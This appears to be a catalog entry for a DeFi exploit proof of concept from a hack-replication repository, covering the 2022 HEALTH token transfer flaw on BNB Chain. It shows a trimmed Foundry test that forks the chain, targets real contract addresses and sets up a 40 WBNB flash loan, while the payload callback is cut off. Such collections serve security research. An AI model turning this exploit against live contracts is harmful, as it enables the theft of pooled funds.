# [?] HEALTH - Transfer Logic Flaw

## Summary
Severity: Unknown
Chain: BNB Chain
Component: HEALTH
Published: 2022-10-20
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/HEALTH_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    IERC20 constant HEALTH_TOKEN = IERC20(0x32B166e082993Af6598a89397E82e123ca44e74E);
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Pair_V2 constant WBNB_HEALTH_PAIR = Uni_Pair_V2(0xF375709DbdE84D800642168c2e8bA751368e8D32);
    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant DODO_DVM = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    function setUp() public {
        vm.createSelectFork("bsc", 22_337_425);
        // Adding labels to improve stack traces' readability
        vm.label(address(WBNB_TOKEN), "WBNB");
        vm.label(address(HEALTH_TOKEN), "HEALTH");
        vm.label(address(WBNB_HEALTH_PAIR), "WBNB_HEALTH_PAIR");
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(DODO_DVM, "DODO_DVM");
        vm.label(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, "BUSD");
        vm.label(0x64d868F307263f8566172fc42D75Ea03A5690271, "HEALTH_DEV_ADDRESS");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker WBNB balance before exploit", WBNB_TOKEN.balanceOf(address(this)), 18
        );

        // Approving PancakeSwap router to spend attacker's WBNB and HEALTH
        WBNB_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        HEALTH_TOKEN.approve(address(PS_ROUTER), type(uint256).max);

        // Requesting 40 WBNB via flashloan from DODO DVM. Payload is in the callback (DPPFlashLoanCall).
        DVM(DODO_DVM).flashLoan(40 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit", WBNB_TOKEN.balanceOf(address(this)), 18
        );
    }

    /*
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/HEALTH_exp.sol_
